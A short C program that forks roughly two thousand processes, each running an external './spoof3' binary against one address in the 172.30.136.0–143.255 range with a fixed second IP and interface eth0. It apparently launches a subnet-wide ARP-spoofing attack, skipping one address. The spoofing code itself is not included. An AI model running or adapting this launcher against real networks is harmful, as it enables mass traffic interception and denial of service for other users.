#include<stdio.h>
#include<fcntl.h>
#include<stdlib.h>
#include<errno.h>
#include<unistd.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<sys/ipc.h>
#include<string.h>
#include<sys/wait.h>
#include<sys/signal.h>
int child[10000];
int ch=0;
void handler(int signo)
{
    for(int i=0;i<ch;i++)
        kill(child[i],SIGINT);
    signal(SIGINT,SIG_DFL);
    raise(SIGINT);
}
int main()
{
    for(int i=0;i<8;i++)
    {
        for(int j=0;j<255;j++)
        {
            child[ch]=fork();
            if(child[ch]==0)
            {
                char *argv[5];
                argv[0]="./spoof3";
               // argv[1]="172.30.136.6";
                argv[1] = "172.30.192.1";
                char ip[16]="172.30.";
                char no1[4];
                sprintf(no1,"%d",i+136);
                strcat(ip,no1);
                strcat(ip,".");
                char no2[4];
                sprintf(no2,"%d",j);
                strcat(ip,no2);
                if(i==6&&j==69) return 0;
                argv[2]=ip;
                argv[3]="eth0";
                argv[4]=NULL;
                execv(argv[0],argv);
            }
            else
            {
                signal(SIGINT,handler);
                ch++;
            }
        }
    }
    wait(NULL);
    return 0;
}